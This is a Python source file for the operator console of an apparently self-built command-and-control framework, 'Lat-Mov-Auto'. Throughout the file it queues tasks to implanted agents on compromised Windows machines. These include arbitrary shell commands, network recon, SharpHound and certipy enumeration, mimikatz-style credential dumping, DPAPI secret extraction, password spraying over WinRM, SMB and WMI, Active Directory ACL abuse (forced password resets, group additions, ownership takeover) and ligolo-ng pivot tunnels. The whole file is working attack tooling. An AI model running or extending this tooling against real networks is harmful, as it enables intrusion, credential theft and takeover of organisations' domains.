#!/usr/bin/env python3
"""
Operator CLI for Lat-Mov-Auto C2.

Global mode:
  agents                      — list registered agents
  hosts                       — list recon-discovered hosts
  credentials                 — list harvested credentials
  loot                        — list uploaded files per agent
  results <agent_id>          — show task results for an agent
  interact <agent_id>         — enter interactive mode for that agent
  tunnels                     — list registered pivot tunnels
  pivot status                — check if ligolo-ng proxy is running
  pivot stop                  — stop the ligolo-ng proxy
  help                        — show this help
  exit / quit                 — exit the CLI

Interact mode  (prompt changes to [agent_id] >):
  <command>                                      — queue a shell task (default)
  shell <command>                                — queue a shell task (explicit)
  recon <ip_or_cidr>                             — queue a recon scan
  sharphound                                     — download + run SharpHound, upload ZIP
  certipy <args>                                 — download certipy.exe + run, upload output files (ADCS enum)
  secretsdump <tool> <args>                      — download tool + run (e.g. mimikatz.exe args)
  dpapi <tool> <args>                            — download tool + run (e.g. SharpDPAPI.exe args)
  authenticate -u <user> -p <pass> [-s <svc>] [-c <cmd>] <target_ip>
                                                 — sweep all recon-detected services on target (winrm/smb/wmi).
                                                   use -s to force one service; -c to run a custom command.
                                                   successful credentials are auto-stored to the DB.
  authenticate -u <user> -p <pass> --all         — try the credential against every known host in the DB.
  spray <target_ip>                              — try ALL stored credentials against target, show access matrix.
  pivot -connect <ip:port> [-iface ligolo]       — start ligolo-ng proxy on server + deploy agent to target.
                                                   place server/proxy and server/files/agent.exe before use.
                                                   after the session appears in the proxy console, type 'start',
                                                   then run: tunnel <subnet> [-iface ligolo]
  tunnel <subnet> [-iface ligolo]                — register a pivot tunnel + add kernel route (after session start)
  aclabuse addmember <group> <user>              — add user to a group (AddMember / GenericAll on group)
  aclabuse forcechangepassword <user> <newpass>  — reset password without knowing current (ForceChangePassword)
  aclabuse genericwrite <target> <attr> <value>  — write an AD attribute (GenericWrite / GenericAll on object)
  aclabuse writedacl <target> <principal> <right>— grant an AD right to principal (WriteDacl on target)
  aclabuse writeowner <target> <new_owner>       — take ownership of an AD object (WriteOwner on target)
  results                                        — show task results for this agent
  back                                           — return to global mode
"""

import sys
import json
import time
import shlex
import requests

SERVER = "http://127.0.0.1:8080"

# Ports that indicate a usable lateral movement service
LATERAL_PORTS = {5985: "winrm", 5986: "winrm", 445: "smb", 135: "wmi"}

# Keywords that indicate a failed authentication attempt.
# Keep these specific — broad terms like "error" cause false positives
# (e.g. "net user /domain" always ends with "completed with one or more errors").
FAIL_KEYWORDS = (
    "winrs error",       # WinRM connectivity / auth failure
    "system error",      # SMB net use failure (e.g. "System error 5")
    "exec error",        # client-side execution failure
    "access is denied",
    "logon failure",
    "invalid password",
    "incorrect password",
)


# ── HTTP helpers ──────────────────────────────────────────────────────────────

def _get(path):
    try:
        r = requests.get(f"{SERVER}{path}", timeout=10)
        r.raise_for_status()
        return r.json()
    except requests.exceptions.ConnectionError:
        print(f"[-] Cannot reach server at {SERVER}")
    except requests.exceptions.HTTPError as e:
        print(f"[-] HTTP {e.response.status_code}: {e.response.text}")
    except Exception as e:
        print(f"[-] {e}")
    return None


def _post(path, payload):
    try:
        r = requests.post(f"{SERVER}{path}", json=payload, timeout=10)
        r.raise_for_status()
        return r.json()
    except requests.exceptions.ConnectionError:
        print(f"[-] Cannot reach server at {SERVER}")
    except requests.exceptions.HTTPError as e:
        print(f"[-] HTTP {e.response.status_code}: {e.response.text}")
    except Exception as e:
        print(f"[-] {e}")
    return None


# ── Result polling ───────────────────────────────────────────────────────────

def _wait_for_result(agent_id, task_id, timeout=120, poll=2):
    """Poll until task_id appears in results, then print output. Timeout in seconds."""
    print(f"[*] Waiting for result (task {task_id})...", flush=True)
    deadline = time.time() + timeout
    while time.time() < deadline:
        rows = _get(f"/results/{agent_id}")
        if rows:
            for r in rows:
                if r["task_id"] == task_id:
                    print()
                    formatted = _format_output(r["output"], r.get("task_type"))
                    if formatted is not None:
                        for line in formatted.splitlines():
                            print(f"  {line}")
                    return
        time.sleep(poll)
    print(f"\n[-] Timed out waiting for task {task_id} result")


# ── Display helpers ───────────────────────────────────────────────────────────

def _print_agents(rows):
    if not rows:
        print("  (no agents registered)")
        return
    print(f"  {'AGENT ID':<36}  {'HOSTNAME':<20}  {'USER':<20}  LAST SEEN")
    print("  " + "-" * 95)
    for r in rows:
        print(f"  {r['agent_id']:<36}  {r['hostname']:<20}  {r['username']:<20}  {r['last_seen']}")


def _print_recon_table(parsed):
    """Render recon JSON {hosts:[{ip,hostname,ports:[{port,service,banner}]}]} as a table."""
    hosts = parsed.get("hosts", [])
    if not hosts:
        print("  (no hosts found)")
        return
    print(f"  {'IP':<16}  {'HOSTNAME':<28}  {'PORT':<7}  {'SERVICE':<22}  BANNER")
    print("  " + "-" * 110)
    for h in hosts:
        ip       = h.get("ip", "")
        hostname = h.get("hostname", "")
        ports    = h.get("ports", [])
        if ports:
            for i, p in enumerate(ports):
                row_ip   = ip       if i == 0 else ""
                row_host = hostname if i == 0 else ""
                banner = (p.get("banner") or "").replace("\r", "").replace("\n", " ").strip()[:55]
                print(f"  {row_ip:<16}  {row_host:<28}  {p.get('port',''):<7}  {p.get('service',''):<22}  {banner}")
        else:
            print(f"  {ip:<16}  {hostname:<28}  {'—':<7}  {'—':<22}")


def _format_output(output, task_type=None):
    """Return formatted string for output; renders recon as table lines."""
    try:
        parsed = json.loads(output)
        if task_type == "recon" or (isinstance(parsed, dict) and "hosts" in parsed):
            _print_recon_table(parsed)
            return None  # already printed
        return json.dumps(parsed, indent=2)
    except Exception:
        return output


def _print_results(rows):
    if not rows:
        print("  (no results yet)")
        return
    for r in rows:
        print(f"\n  [task {r['task_id']}] [{r['task_type']}] {r['instruction']}")
        print(f"  received: {r['received_at']}")
        print("  " + "-" * 60)
        formatted = _format_output(r["output"], r.get("task_type"))
        if formatted is not None:
            for line in formatted.splitlines():
                print(f"  {line}")


def _print_hosts(rows):
    if not rows:
        print("  (no hosts discovered)")
        return
    print(f"  {'IP':<16}  {'HOSTNAME':<30}  OPEN PORTS")
    print("  " + "-" * 75)
    for r in rows:
        print(f"  {r['ip']:<16}  {r.get('hostname',''):<30}  {r.get('open_ports','')}")


def _print_credentials(rows):
    if not rows:
        print("  (no credentials stored)")
        return
    print(f"  {'USERNAME':<30}  {'TYPE':<12}  {'SOURCE':<20}  SECRET")
    print("  " + "-" * 90)
    for r in rows:
        secret_preview = r["secret"][:40] + ("..." if len(r["secret"]) > 40 else "")
        print(f"  {r['username']:<30}  {r['cred_type']:<12}  {r['source_host']:<20}  {secret_preview}")


def _print_loot(data):
    if not data:
        print("  (no loot)")
        return
    for agent_id, files in data.items():
        print(f"  {agent_id}:")
        for f in files:
            print(f"    - {f}")


def _print_tunnels(rows):
    if not rows:
        print("  (no tunnels)")
        return
    print(f"  {'ID':<6}  {'AGENT':<20}  {'SUBNET':<20}  {'IFACE':<12}  STATUS")
    print("  " + "-" * 72)
    for r in rows:
        print(f"  {r['tunnel_id']:<6}  {r['agent_id']:<20}  {r['subnet']:<20}  {r['interface']:<12}  {r.get('status', 'active')}")


# ── Pivot helpers ────────────────────────────────────────────────────────────

def _parse_pivot_args(arg):
    """Parse: -connect <ip:port> [-iface <name>]"""
    tokens = arg.split()
    connect = None
    iface = "ligolo"
    i = 0
    while i < len(tokens):
        if tokens[i] == "-connect" and i + 1 < len(tokens):
            connect = tokens[i + 1]; i += 2
        elif tokens[i] == "-iface" and i + 1 < len(tokens):
            iface = tokens[i + 1]; i += 2
        else:
            i += 1
    return connect, iface


def _parse_tunnel_args(arg):
    """Parse: <subnet> [-iface <name>]"""
    tokens = arg.split()
    subnet = None
    iface = "ligolo"
    i = 0
    while i < len(tokens):
        if tokens[i] == "-iface" and i + 1 < len(tokens):
            iface = tokens[i + 1]; i += 2
        else:
            subnet = tokens[i]; i += 1
    return subnet, iface


# ── Authenticate helpers ──────────────────────────────────────────────────────

def _parse_auth_args(arg):
    """Parse: -u user -p password [-s service] [-c command] [--all] [target]"""
    try:
        tokens = shlex.split(arg, posix=False)
    except ValueError:
        tokens = arg.split()
    username = password = target = service = command = None
    spray_all = False
    i = 0
    while i < len(tokens):
        if tokens[i] == "-u" and i + 1 < len(tokens):
            username = tokens[i + 1].strip("'\""); i += 2
        elif tokens[i] == "-p" and i + 1 < len(tokens):
            password = tokens[i + 1].strip("'\""); i += 2
        elif tokens[i] == "-s" and i + 1 < len(tokens):
            service = tokens[i + 1].lower(); i += 2
        elif tokens[i] == "-c" and i + 1 < len(tokens):
            command = tokens[i + 1].strip("'\""); i += 2
        elif tokens[i] == "--all":
            spray_all = True; i += 1
        else:
            target = tokens[i]; i += 1
    return username, password, target, service, command, spray_all


def _services_for_target(target_ip):
    """
    Look up target_ip in the hosts table and return the list of lateral movement
    services available based on open ports.
    Returns [] if the host is known but no lateral ports are open.
    Returns None if the host is not in the DB at all.
    """
    hosts = _get("/hosts")
    if not hosts:
        return None
    for h in hosts:
        if h["ip"] == target_ip:
            open_ports = [int(p) for p in h.get("open_ports", "").split(",") if p.strip().isdigit()]
            services = []
            for port in open_ports:
                svc = LATERAL_PORTS.get(port)
                if svc and svc not in services:
                    services.append(svc)
            return services
    return None  # not found in DB


def _is_auth_failure(output: str) -> bool:
    return any(kw in output.lower() for kw in FAIL_KEYWORDS)


def _auth_check(agent_id, username, password, target, service, command=None, timeout=30):
    """
    Queue one authenticate task and return (success: bool, output: str | None).
    Returns (False, None) on timeout or server error.
    """
    instruction = f"{username}|{password}|{target}|{service}"
    if command:
        instruction += f"|{command}"
    res = _post("/task", {"agent_id": agent_id, "task_type": "authenticate", "instruction": instruction})
    if not res:
        return False, None

    deadline = time.time() + timeout
    while time.time() < deadline:
        rows = _get(f"/results/{agent_id}")
        if rows:
            for r in rows:
                if r["task_id"] == res["task_id"]:
                    out = r["output"]
                    return not _is_auth_failure(out), out
        time.sleep(2)
    return False, None


def _store_credential(agent_id, username, password, source_host, cred_type="plaintext"):
    """Persist a working credential to the server DB."""
    _post("/credentials", {
        "agent_id":    agent_id,
        "username":    username,
        "secret":      password,
        "cred_type":   cred_type,
        "source_host": source_host,
    })


def _do_auth_sweep(agent_id, username, password, target, services, command=None):
    """
    Try each service sequentially, print per-service results, and auto-store
    the credential if any service succeeds (Feature 1).
    """
    print(f"[*] Sweeping {len(services)} service(s) on {target}: {', '.join(s.upper() for s in services)}")
    results = {}   # service → (success: bool, output: str | None)
    stored  = False

    for svc in services:
        print(f"  [{svc.upper()}] queuing...", flush=True)
        success, output = _auth_check(agent_id, username, password, target, svc, command)
        results[svc] = (success, output)

        # Feature 1 — auto-store on first success
        if success and not stored:
            _store_credential(agent_id, username, password, target)
            print(f"  [*] Credential stored to DB ({username} @ {target})")
            stored = True

    # ── Summary ───────────────────────────────────────────────────────────────
    print(f"\n{'─'*60}")
    print(f"  Auth sweep results for {target}:")
    print(f"{'─'*60}")
    success_count = 0
    for svc, (ok, out) in results.items():
        if out is None:
            tag, status = "?", "TIMEOUT / no response"
        elif ok:
            tag, status = "+", "SUCCESS"
            success_count += 1
        else:
            tag, status = "-", "FAILED"

        print(f"  [{tag}] {svc.upper():<8} {status}")
        if out:
            for line in out.strip().splitlines()[:5]:
                print(f"         {line}")
        print()

    open_svcs = [s for s, (ok, _) in results.items() if ok]
    print(f"{'─'*60}")
    print(f"  {success_count}/{len(services)} service(s) accessible — paths open: "
          + (", ".join(s.upper() for s in open_svcs) or "none"))
    print(f"{'─'*60}\n")


# ── Feature 2 — Credential spray from DB ─────────────────────────────────────

def _do_spray(agent_id, target):
    """Try every stored credential against a single target (spray from DB)."""
    creds = _get("/credentials")
    if not creds:
        print("[-] No credentials in DB — run secretsdump or store credentials first.")
        return

    available = _services_for_target(target)
    if available is None:
        print(f"[-] No recon data for {target} — run 'recon' first.")
        return
    if not available:
        print(f"[-] No lateral movement ports found for {target} in recon data.")
        return

    # Deduplicate credentials by (username, secret)
    seen = set()
    unique_creds = []
    for c in creds:
        key = (c["username"], c["secret"])
        if key not in seen:
            seen.add(key)
            unique_creds.append(c)

    print(f"[*] Spraying {len(unique_creds)} credential(s) against {target} "
          f"({', '.join(s.upper() for s in available)})\n")

    col_w  = 42
    svc_w  = 8
    header = f"  {'CREDENTIAL':<{col_w}}" + "".join(f"  {s.upper():<{svc_w}}" for s in available)
    print(header)
    print("  " + "─" * (col_w + (svc_w + 2) * len(available)))

    success_count = 0
    for cred in unique_creds:
        uname  = cred["username"]
        secret = cred["secret"]
        label  = f"{uname} / {secret[:28]}{'…' if len(secret) > 28 else ''}"

        svc_results = {}
        for svc in available:
            ok, _ = _auth_check(agent_id, uname, secret, target, svc)
            svc_results[svc] = ok

        any_ok = any(svc_results.values())
        if any_ok:
            success_count += 1
            _store_credential(agent_id, uname, secret, target)

        tag     = "+" if any_ok else "-"
        svc_str = "".join(f"  {'OK' if ok else '--':<{svc_w}}" for ok in svc_results.values())
        print(f"  [{tag}] {label:<{col_w}}{svc_str}")

    print(f"\n  {success_count}/{len(unique_creds)} credential(s) granted access on {target}\n")


# ── Feature 3 — Multi-target spray ───────────────────────────────────────────

def _do_spray_all(agent_id, username, password):
    """Try one credential against every host in the DB with lateral movement ports open."""
    hosts = _get("/hosts")
    if not hosts:
        print("[-] No hosts in DB — run 'recon' first.")
        return

    targets = []
    for h in hosts:
        open_ports = [int(p) for p in h.get("open_ports", "").split(",") if p.strip().isdigit()]
        svcs = []
        for port in open_ports:
            svc = LATERAL_PORTS.get(port)
            if svc and svc not in svcs:
                svcs.append(svc)
        if svcs:
            targets.append((h["ip"], h.get("hostname", ""), svcs))

    if not targets:
        print("[-] No hosts with lateral movement ports found in DB.")
        return

    print(f"[*] Spraying {username} across {len(targets)} host(s)...\n")

    col_ip   = 16
    col_host = 24
    all_svcs = ["winrm", "smb", "wmi"]
    svc_w    = 8
    header   = (f"  {'IP':<{col_ip}}  {'HOSTNAME':<{col_host}}"
                + "".join(f"  {s.upper():<{svc_w}}" for s in all_svcs))
    print(header)
    print("  " + "─" * (col_ip + 2 + col_host + (svc_w + 2) * len(all_svcs)))

    success_hosts = 0
    stored = False
    for ip, hostname, svcs in targets:
        row_results = {}
        for svc in all_svcs:
            if svc not in svcs:
                row_results[svc] = None   # port not open — skip
                continue
            ok, _ = _auth_check(agent_id, username, password, ip, svc)
            row_results[svc] = ok

        any_ok = any(v for v in row_results.values() if v is not None and v)
        if any_ok:
            success_hosts += 1
            if not stored:
                _store_credential(agent_id, username, password, ip)
                stored = True

        tag = "+" if any_ok else "-"

        def cell(v):
            if v is None: return f"{'N/A':<{svc_w}}"
            return f"{'OK' if v else '--':<{svc_w}}"

        svc_str = "".join(f"  {cell(row_results[s])}" for s in all_svcs)
        print(f"  [{tag}] {ip:<{col_ip}}  {hostname:<{col_host}}{svc_str}")

    print(f"\n  {success_hosts}/{len(targets)} host(s) accessible with {username}\n")


# ── Global commands ───────────────────────────────────────────────────────────

def handle_global(line):
    """Returns (new_agent_id | None) if we should switch to interact mode."""
    parts = line.split(None, 1)
    cmd = parts[0].lower()
    arg = parts[1] if len(parts) > 1 else ""

    if cmd in ("exit", "quit"):
        print("bye.")
        sys.exit(0)

    elif cmd == "help":
        print(__doc__)

    elif cmd == "agents":
        rows = _get("/agents")
        if rows is not None:
            _print_agents(rows)

    elif cmd == "hosts":
        rows = _get("/hosts")
        if rows is not None:
            _print_hosts(rows)

    elif cmd == "credentials":
        rows = _get("/credentials")
        if rows is not None:
            _print_credentials(rows)

    elif cmd == "loot":
        data = _get("/loot")
        if data is not None:
            _print_loot(data)

    elif cmd == "results":
        if not arg:
            print("usage: results <agent_id>")
        else:
            rows = _get(f"/results/{arg}")
            if rows is not None:
                _print_results(rows)

    elif cmd == "tunnels":
        rows = _get("/pivot/tunnels")
        if rows is not None:
            _print_tunnels(rows)

    elif cmd == "pivot":
        sub = arg.strip().lower()
        if sub == "status":
            res = _get("/pivot/proxy/status")
            if res is not None:
                if res.get("running"):
                    print(f"[+] Proxy running (PID {res.get('pid')})")
                else:
                    code = res.get("exit_code")
                    print(f"[-] Proxy not running" + (f" (exit code {code})" if code is not None else ""))
        elif sub == "stop":
            res = _post("/pivot/proxy/stop", {})
            if res is not None:
                print("[+] Proxy stopped" if res.get("was_running") else "[*] Proxy was not running")
        else:
            print("usage: pivot status | pivot stop")

    elif cmd == "interact":
        if not arg:
            print("usage: interact <agent_id>")
            return None
        # Verify agent exists
        agents = _get("/agents")
        if agents is None:
            return None
        ids = [a["agent_id"] for a in agents]
        if arg not in ids:
            print(f"[-] Agent '{arg}' not found. Known agents:")
            _print_agents(agents)
            return None
        print(f"[*] Entering interact mode for {arg}  (type 'back' to return)")
        return arg

    else:
        print(f"[-] Unknown command: {cmd}  (type 'help' for usage)")

    return None


# ── Interact commands ─────────────────────────────────────────────────────────

def handle_interact(line, agent_id):
    """Returns True to stay in interact mode, False to go back to global."""
    parts = line.split(None, 1)
    cmd = parts[0].lower()
    arg = parts[1] if len(parts) > 1 else ""

    if cmd == "back":
        print("[*] Returning to global mode")
        return False

    elif cmd in ("exit", "quit"):
        print("bye.")
        sys.exit(0)

    elif cmd == "results":
        rows = _get(f"/results/{agent_id}")
        if rows is not None:
            _print_results(rows)

    elif cmd == "recon":
        if not arg:
            print("usage: recon <ip_or_cidr>")
        else:
            res = _post("/recon", {"agent_id": agent_id, "target": arg})
            if res:
                print(f"[+] Recon task queued — task_id: {res['task_id']}")
                _wait_for_result(agent_id, res["task_id"])

    elif cmd == "sharphound":
        res = _post("/task", {"agent_id": agent_id, "task_type": "sharphound", "instruction": arg or ""})
        if res:
            print(f"[+] SharpHound task queued — task_id: {res['task_id']}")
            _wait_for_result(agent_id, res["task_id"], timeout=300)

    elif cmd == "certipy":
        if not arg:
            print("usage: certipy <args>  (e.g. certipy find -u user@domain -p Pass -dc-ip 10.0.0.1)")
        else:
            res = _post("/task", {"agent_id": agent_id, "task_type": "certipy", "instruction": arg})
            if res:
                print(f"[+] Certipy task queued — task_id: {res['task_id']}")
                _wait_for_result(agent_id, res["task_id"], timeout=120)

    elif cmd == "secretsdump":
        if not arg:
            print("usage: secretsdump <toolname.exe> [args...]")
        else:
            res = _post("/task", {"agent_id": agent_id, "task_type": "secretsdump", "instruction": arg})
            if res:
                print(f"[+] Secretsdump task queued — task_id: {res['task_id']}")
                _wait_for_result(agent_id, res["task_id"], timeout=120)

    elif cmd == "dpapi":
        if not arg:
            print("usage: dpapi <toolname.exe> [args...]")
        else:
            res = _post("/task", {"agent_id": agent_id, "task_type": "dpapi", "instruction": arg})
            if res:
                print(f"[+] DPAPI task queued — task_id: {res['task_id']}")
                _wait_for_result(agent_id, res["task_id"], timeout=120)

    elif cmd == "authenticate":
        if not arg:
            print("usage: authenticate -u <user> -p <pass> [-s winrm|smb|wmi] [-c <cmd>] [--all | <target_ip>]")
        else:
            username, password, target, service, command, spray_all = _parse_auth_args(arg)

            if not username or not password:
                print("[-] Missing -u / -p. usage: authenticate -u <user> -p <pass> [-s svc] [-c cmd] [--all | <target>]")
            elif spray_all:
                # Feature 3 — one credential, all known hosts
                if command:
                    print("[!] -c is ignored with --all")
                _do_spray_all(agent_id, username, password)
            elif service:
                # Forced service — single auth with optional custom command
                if not target:
                    print("[-] Missing target IP.")
                else:
                    ok, output = _auth_check(agent_id, username, password, target, service, command)
                    suffix = f" — running: {command}" if command else ""
                    print(f"[{'+'if ok else'-'}] [{service.upper()}]{suffix}")
                    if output:
                        for line in output.strip().splitlines():
                            print(f"  {line}")
                    if ok:
                        _store_credential(agent_id, username, password, target)
                        print(f"[*] Credential stored to DB ({username} @ {target})")
            else:
                # Auto-sweep all recon-detected services on target
                if not target:
                    print("[-] Missing target IP.")
                elif command:
                    print("[!] -c is only supported with -s (sweep uses default probes per service)")
                else:
                    available = _services_for_target(target)
                    if available is None:
                        print(f"[-] No recon data for {target} — run 'recon' first or use -s [winrm|smb|wmi]")
                    elif not available:
                        print(f"[-] No lateral movement ports found for {target} in recon data")
                    else:
                        _do_auth_sweep(agent_id, username, password, target, available)

    elif cmd == "aclabuse":
        _ACLABUSE_USAGE = {
            "addmember":           ("group user",            2),
            "forcechangepassword": ("user newpassword",      2),
            "genericwrite":        ("target attribute value", 3),
            "writedacl":           ("target principal right", 3),
            "writeowner":          ("target new_owner",      2),
        }
        if not arg:
            print("usage: aclabuse <op> <args>")
            for op, (sig, _) in _ACLABUSE_USAGE.items():
                print(f"  aclabuse {op} {sig}")
        else:
            try:
                tokens = shlex.split(arg, posix=False)
            except ValueError:
                tokens = arg.split()
            tokens = [t.strip("'\"") for t in tokens]

            op = tokens[0].lower() if tokens else ""
            op_args = tokens[1:]

            if op not in _ACLABUSE_USAGE:
                print(f"[-] Unknown operation '{op}'. Valid: {', '.join(_ACLABUSE_USAGE)}")
            else:
                _, required = _ACLABUSE_USAGE[op]
                if len(op_args) < required:
                    sig, _ = _ACLABUSE_USAGE[op]
                    print(f"[-] {op} requires {required} argument(s): {sig}")
                else:
                    instruction = "|".join([op] + op_args)
                    res = _post("/task", {
                        "agent_id":    agent_id,
                        "task_type":   "aclabuse",
                        "instruction": instruction,
                    })
                    if res:
                        print(f"[+] ACL abuse task queued — task_id: {res['task_id']}")
                        _wait_for_result(agent_id, res["task_id"], timeout=60)

    elif cmd == "pivot":
        if not arg:
            print("usage: pivot -connect <ip:port> [-iface ligolo]")
        else:
            connect, iface = _parse_pivot_args(arg)
            if not connect:
                print("[-] Missing -connect <ip:port>")
            else:
                port = 11601
                if ":" in connect:
                    try:
                        port = int(connect.split(":")[-1])
                    except ValueError:
                        pass

                print(f"[*] Starting ligolo-ng proxy on server (iface: {iface}, port: {port})...")
                proxy_res = _post("/pivot/proxy/start", {"interface": iface, "port": port})
                if not proxy_res:
                    return True

                if proxy_res.get("already_running"):
                    print(f"[*] Proxy already running (PID {proxy_res.get('pid')})")
                else:
                    print(f"[+] Proxy started (PID {proxy_res.get('pid')}) — TUN: {iface}, port: {port}")

                print(f"[*] Deploying ligolo-ng agent to {agent_id}...")
                task_res = _post("/task", {
                    "agent_id":    agent_id,
                    "task_type":   "pivot",
                    "instruction": connect,
                })
                if task_res:
                    print(f"[+] Pivot task queued — task_id: {task_res['task_id']}")
                    _wait_for_result(agent_id, task_res["task_id"], timeout=60)
                    print()
                    print("[*] Next steps:")
                    print("     1. In the ligolo-ng proxy console: select session → type 'start'")
                    print(f"    2. Run: tunnel <subnet> [-iface {iface}]")

    elif cmd == "tunnel":
        if not arg:
            print("usage: tunnel <subnet> [-iface ligolo]  (e.g. tunnel 10.0.2.0/24)")
        else:
            subnet, iface = _parse_tunnel_args(arg)
            if not subnet:
                print("[-] Missing subnet (e.g. 10.0.2.0/24)")
            else:
                res = _post("/pivot/tunnel", {
                    "agent_id":  agent_id,
                    "subnet":    subnet,
                    "interface": iface,
                })
                if res:
                    print(f"[+] Tunnel registered — {subnet} via {iface} (tunnel_id: {res.get('tunnel_id')})")
                    print(f"[*] Route added: {subnet} dev {iface}")

    elif cmd == "spray":
        if not arg:
            print("usage: spray <target_ip>")
        else:
            _do_spray(agent_id, arg.strip())

    elif cmd == "shell":
        command = arg if arg else ""
        if not command:
            print("usage: shell <command>")
        else:
            res = _post("/task", {"agent_id": agent_id, "task_type": "shell", "instruction": command})
            if res:
                print(f"[+] Shell task queued — task_id: {res['task_id']}")
                _wait_for_result(agent_id, res["task_id"])

    else:
        # Default: treat the whole line as a shell command
        res = _post("/task", {"agent_id": agent_id, "task_type": "shell", "instruction": line})
        if res:
            print(f"[+] Shell task queued — task_id: {res['task_id']}")
            _wait_for_result(agent_id, res["task_id"])

    return True


# ── Main REPL ─────────────────────────────────────────────────────────────────

def main():
    current_agent = None
    print(f"[*] Lat-Mov-Auto operator CLI  (server: {SERVER})")
    print("[*] Type 'help' for usage.\n")

    while True:
        try:
            prompt = f"[{current_agent}] > " if current_agent else "[C2] > "
            line = input(prompt).strip()
        except (KeyboardInterrupt, EOFError):
            print("\nbye.")
            sys.exit(0)

        if not line:
            continue

        if current_agent:
            stay = handle_interact(line, current_agent)
            if not stay:
                current_agent = None
        else:
            result = handle_global(line)
            if result:
                current_agent = result


if __name__ == "__main__":
    main()
